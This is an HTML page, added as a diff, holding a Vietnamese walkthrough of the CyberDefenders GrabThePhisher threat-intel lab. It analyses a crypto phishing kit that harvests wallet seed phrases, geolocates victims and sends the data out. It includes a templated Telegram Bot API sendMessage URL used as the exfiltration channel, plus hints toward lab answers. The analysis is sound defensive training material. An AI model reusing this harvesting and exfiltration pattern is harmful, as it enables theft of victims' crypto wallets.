@@ -1,0 +1,123 @@
+<!doctype html>
+<html lang="vi" translate="no" class="notranslate">
+<head>
+<meta charset="utf-8">
+<meta name="google" content="notranslate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self' 'sha256-K65AckC8Kni8xRtJL2GTaDpcWiXKw4p6QJiEl43/uPI='; img-src 'self' https://avatars.githubusercontent.com; script-src 'self'; base-uri 'none'; form-action 'none'">
+<meta name="referrer" content="no-referrer">
+<style>html:not(.pv) body>*:not(noscript),html.dt body>*{display:none!important}html.dt body::before{content:"Đóng DevTools hoặc tải lại trang để xem nội dung.";display:block;padding:48px 16px;text-align:center;font:18px/1.5 system-ui,sans-serif}</style>
+<title>GrabThePhisher lab - CyberDefenders writeup tiếng Việt | Chiendn2k1</title>
+<meta name="description" content="CyberDefenders GrabThePhisher writeup (walkthrough tiếng Việt): Đọc mã nguồn một phishing kit tiền điện tử để tìm cách kit lấy seed phrase của nạn nhân, kênh gửi dữ liệu ra ngoài và dấu vết người viết kit.">
+<meta name="author" content="Chiendn2k1">
+<link rel="canonical" href="https://chiendn2k1-ahahaha.github.io/cyberdefenders-writeups/labs/grabthephisher.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="CyberDefenders writeups">
+<meta property="og:title" content="GrabThePhisher lab - CyberDefenders writeup tiếng Việt | Chiendn2k1">
+<meta property="og:description" content="CyberDefenders GrabThePhisher writeup (walkthrough tiếng Việt): Đọc mã nguồn một phishing kit tiền điện tử để tìm cách kit lấy seed phrase của nạn nhân, kênh gửi dữ liệu ra ngoài và dấu vết người viết kit.">
+<meta property="og:url" content="https://chiendn2k1-ahahaha.github.io/cyberdefenders-writeups/labs/grabthephisher.html">
+<meta property="og:locale" content="vi_VN">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "GrabThePhisher - CyberDefenders writeup", "description": "Đọc mã nguồn một phishing kit tiền điện tử để tìm cách kit lấy seed phrase của nạn nhân, kênh gửi dữ liệu ra ngoài và dấu vết người viết kit.", "inLanguage": "vi", "url": "https://chiendn2k1-ahahaha.github.io/cyberdefenders-writeups/labs/grabthephisher.html", "dateModified": "2026-11-04", "author": {"@type": "Person", "name": "Chiendn2k1", "url": "https://cyberdefenders.org/p/Chiendn2k1/"}, "keywords": "CyberDefenders, GrabThePhisher, writeup, walkthrough, Threat Intel, Text Editor", "about": {"@type": "Thing", "name": "CyberDefenders GrabThePhisher lab", "url": "https://cyberdefenders.org/blueteam-ctf-challenges/grabthephisher/"}}</script>
+<link rel="icon" href="../favicon.ico" sizes="any">
+<link rel="icon" type="image/png" href="../assets/favicon-32.png">
+<link rel="apple-touch-icon" href="../assets/apple-touch-icon.png">
+<link rel="stylesheet" href="../style.css?v=c0502c0f">
+<script src="../protect.js?v=2d57047c"></script>
+</head>
+<body>
+<noscript>Trang cần bật JavaScript để hiển thị nội dung.</noscript>
+<header class="top"><a class="brand" href="../">CyberDefenders writeups</a>
+<nav class="me">
+<a href="https://www.linkedin.com/in/chiendn/" rel="noopener noreferrer" target="_blank">LinkedIn</a>
+<a href="https://github.com/chiendn2k1-ahahaha" rel="noopener noreferrer" target="_blank">GitHub</a>
+<a href="https://cyberdefenders.org/blueteam-ctf-challenges/leaderboard/" rel="noopener noreferrer" target="_blank">Bảng xếp hạng</a>
+<a class="ava" href="https://cyberdefenders.org/p/Chiendn2k1/" rel="noopener noreferrer" target="_blank" title="Chiendn2k1 trên CyberDefenders"><img src="https://avatars.githubusercontent.com/u/352285299?s=80" alt="Avatar Chiendn2k1" width="36" height="36"></a>
+</nav></header>
+<main class="page">
+<nav class="toc"><b>Mục lục</b><ul><li><a href="#tom-tat-ket-qua">Tóm tắt kết quả</a></li><li><a href="#buoc-1-tim-trang-lua-ao-va-script-xu-ly">Bước 1: tìm trang lừa đảo và script xử lý</a></li><li><a href="#buoc-2-dich-vu-lay-thong-tin-may-nan-nhan">Bước 2: dịch vụ lấy thông tin máy nạn nhân</a></li><li><a href="#buoc-3-kenh-gui-du-lieu-ra-ngoai">Bước 3: kênh gửi dữ liệu ra ngoài</a></li><li><a href="#buoc-4-du-lieu-a-bi-thu-thap">Bước 4: dữ liệu đã bị thu thập</a></li><li><a href="#buoc-5-dau-vet-nguoi-viet-kit">Bước 5: dấu vết người viết kit</a></li></ul></nav>
+<article>
+<h1 id="grabthephisher">GrabThePhisher</h1>
+<ul>
+<li><strong>Lab:</strong> <a href="https://cyberdefenders.org/blueteam-ctf-challenges/grabthephisher/">GrabThePhisher</a> trên CyberDefenders. Nhóm Threat Intel, độ khó Easy, đã retired.</li>
+<li><strong>Dữ liệu:</strong> file nén chứa mã nguồn của một phishing kit (bộ trang web giả mạo dựng sẵn để lừa người dùng nhập thông tin). Kit gồm giao diện giả, script xử lý phía server và một thư mục log.</li>
+<li><strong>Công cụ:</strong> <code>Get-Content</code> hoặc trình soạn thảo văn bản để đọc mã nguồn. Không cần chạy kit.</li>
+<li><strong>Quy ước:</strong></li>
+<li>Giá trị có thể là đáp án của lab (tên file, token, chat ID, seed phrase, tên người viết kit...) được thay bằng mô tả chung, kèm dòng "Hướng giải" chỉ chỗ tìm.</li>
+<li><span class="red">Khung đỏ</span> trên ảnh là chỗ cần chú ý, vùng làm mờ là giá trị trùng với đáp án.</li>
+</ul>
+<h2 id="tom-tat-ket-qua">Tóm tắt kết quả</h2>
+<ul>
+<li>Kit giả giao diện một sàn giao dịch phi tập trung (DEX, sàn đổi tiền điện tử chạy trên blockchain). Khi nạn nhân bấm kết nối ví, kit mở một trang khôi phục ví giả.</li>
+<li>Trang giả yêu cầu nhập seed phrase. Đây là chuỗi 12 từ dùng để khôi phục ví. Ai có chuỗi này là kiểm soát được toàn bộ tài sản trong ví.</li>
+<li>Một script phía server nhận seed phrase và làm ba việc:</li>
+<li>tra vị trí của nạn nhân qua một dịch vụ GeoIP (dịch vụ đổi địa chỉ IP thành quốc gia, thành phố);</li>
+<li>ghi seed phrase vào một file log trên server;</li>
+<li>gửi seed phrase kèm vị trí về một kênh Telegram qua Telegram Bot API.</li>
+<li>Token của bot và chat ID của kênh được viết cứng trong script. Đầu script có đoạn chú thích ký tên người viết kit.</li>
+<li><strong>File log đã chứa sẵn nhiều seed phrase</strong>, tức kit đã được dùng để lấy dữ liệu của nạn nhân thật trong kịch bản lab.</li>
+</ul>
+<h2 id="buoc-1-tim-trang-lua-ao-va-script-xu-ly">Bước 1: tìm trang lừa đảo và script xử lý</h2>
+<ul>
+<li><strong>Mục tiêu:</strong> xác định ví bị giả mạo và file nhận dữ liệu nạn nhân nhập.</li>
+<li><strong>Cách làm:</strong></li>
+<li>Duyệt cây thư mục của kit. Có một thư mục riêng mang tên ví bị giả mạo, bên trong là trang <code>index.html</code> giả trang khôi phục ví.</li>
+<li>Mở trang này, xem form gửi dữ liệu (POST) tới file nào. File đích là script xử lý nằm cùng thư mục.</li>
+<li><strong>Nhận định:</strong></li>
+<li>Script nhận seed phrase qua một tham số POST rồi xử lý ngay trên server.</li>
+<li>Ngôn ngữ của kit nhận ra được từ phần mở rộng và cú pháp của file script.</li>
+<li>Hướng giải: tên ví xuất hiện ở tên thư mục, giao diện trang giả và trong dòng "Wallet:" của tin nhắn mà script tạo ra. Tên script là file mà form gửi dữ liệu tới.</li>
+</ul>
+<h2 id="buoc-2-dich-vu-lay-thong-tin-may-nan-nhan">Bước 2: dịch vụ lấy thông tin máy nạn nhân</h2>
+<ul>
+<li><strong>Mục tiêu:</strong> xem kit thu thập thêm gì về nạn nhân ngoài seed phrase.</li>
+<li><strong>Cách làm:</strong> trong script, tìm lời gọi HTTP ra ngoài có dùng biến chứa IP của client.</li>
+</ul>
+<figure><img src="../img/grabthephisher/gp-01-script.png" alt="Toàn bộ script PHP xử lý seed phrase"><figcaption>Toàn bộ script xử lý (44 dòng). Khung đỏ trên cùng: gọi API JSON của một dịch vụ GeoIP với IP của nạn nhân. Khối chú thích ký tên người viết (đã làm mờ). Ba khung đỏ cuối: chat ID, token bot (đã làm mờ) và URL sendMessage của Telegram Bot API. Dòng gần cuối ghi seed phrase nối tiếp vào log/log.txt. Tên dịch vụ, tên ví và tên hàm ghi file đã làm mờ.</figcaption></figure>
+
+<ul>
+<li><strong>Nhận định:</strong></li>
+<li>Script gửi IP của nạn nhân tới API dạng JSON của một dịch vụ GeoIP, rồi lấy tên quốc gia và tên thành phố trong kết quả trả về.</li>
+<li>Hai giá trị này được ghép vào tin nhắn gửi cho kẻ tấn công, giúp họ biết nạn nhân ở đâu.</li>
+<li>Hướng giải: tên dịch vụ suy ra từ tên miền trong URL API mà script gọi.</li>
+</ul>
+<h2 id="buoc-3-kenh-gui-du-lieu-ra-ngoai">Bước 3: kênh gửi dữ liệu ra ngoài</h2>
+<ul>
+<li><strong>Mục tiêu:</strong> xác định dữ liệu bị gửi đi đâu.</li>
+<li><strong>Cách làm:</strong> đọc hàm gửi tin trong script. Hàm ghép seed phrase và thông tin vị trí thành một tin nhắn HTML, rồi gửi bằng HTTP GET tới endpoint <code>sendMessage</code> của Telegram Bot API.</li>
+</ul>
+<pre><code class="language-text">https://api.telegram.org/bot&lt;token bot&gt;/sendMessage?chat_id=&lt;chat ID&gt;&amp;text=...
+</code></pre>
+<ul>
+<li><strong>Nhận định:</strong></li>
+<li>Kênh nhận dữ liệu là Telegram. Token của bot và chat ID của kênh được khai báo thành hai biến viết cứng trong script.</li>
+<li>Lưu lượng tới <code>api.telegram.org</code> dùng HTTPS, nên nhìn từ mạng rất khó phân biệt với việc dùng Telegram bình thường.</li>
+<li>Hướng giải: token và chat ID nằm ở hai biến khai báo ngay trước hàm gửi tin.</li>
+</ul>
+<h2 id="buoc-4-du-lieu-a-bi-thu-thap">Bước 4: dữ liệu đã bị thu thập</h2>
+<ul>
+<li><strong>Mục tiêu:</strong> đánh giá kit đã lấy được bao nhiêu dữ liệu.</li>
+<li><strong>Cách làm:</strong> mở file text trong thư mục log của kit. Script ghi nối tiếp (chế độ append) mỗi seed phrase vào cuối file này, nên mỗi dòng là một lần nạn nhân nhập.</li>
+</ul>
+<figure><img src="../img/grabthephisher/gp-02-log.png" alt="Nội dung log.txt"><figcaption>Nội dung log/log.txt và số dòng. Mỗi dòng là một seed phrase (đã làm mờ). Dòng cuối trong khung đỏ là lần nhập gần nhất. Số dòng đã làm mờ.</figcaption></figure>
+
+<ul>
+<li><strong>Nhận định:</strong></li>
+<li>File đã có sẵn nhiều dòng seed phrase. Vì script ghi nối tiếp, dòng cuối cùng là lần lừa đảo gần nhất.</li>
+<li>File này là bản lưu dự phòng phía server, độc lập với tin nhắn Telegram.</li>
+<li>Chưa đủ dữ liệu để biết IP và thời điểm của từng nạn nhân: bộ dữ liệu không có log truy cập của web server (<code>access.log</code>, <code>error.log</code>).</li>
+<li>Hướng giải: đếm số dòng trong file log và lấy dòng cuối.</li>
+</ul>
+<h2 id="buoc-5-dau-vet-nguoi-viet-kit">Bước 5: dấu vết người viết kit</h2>
+<ul>
+<li><strong>Mục tiêu:</strong> tìm thông tin về người viết hoặc phát tán kit.</li>
+<li><strong>Cách làm:</strong> đọc khối chú thích ở đầu script.</li>
+<li><strong>Nhận định:</strong></li>
+<li>Người viết để lại lời nhắn gửi "anh em" trong giới lừa đảo, coi kit là "món quà nhỏ", và ký tên bằng một handle (biệt danh trên mạng).</li>
+<li>Kit được chia sẻ cho người khác dùng lại, nên người vận hành kênh Telegram chưa chắc là người viết kit.</li>
+<li>Hướng giải: handle nằm ở dòng ký tên cuối khối chú thích.</li>
+</ul>
+</article>
+</main>
+
+</body>
+</html>
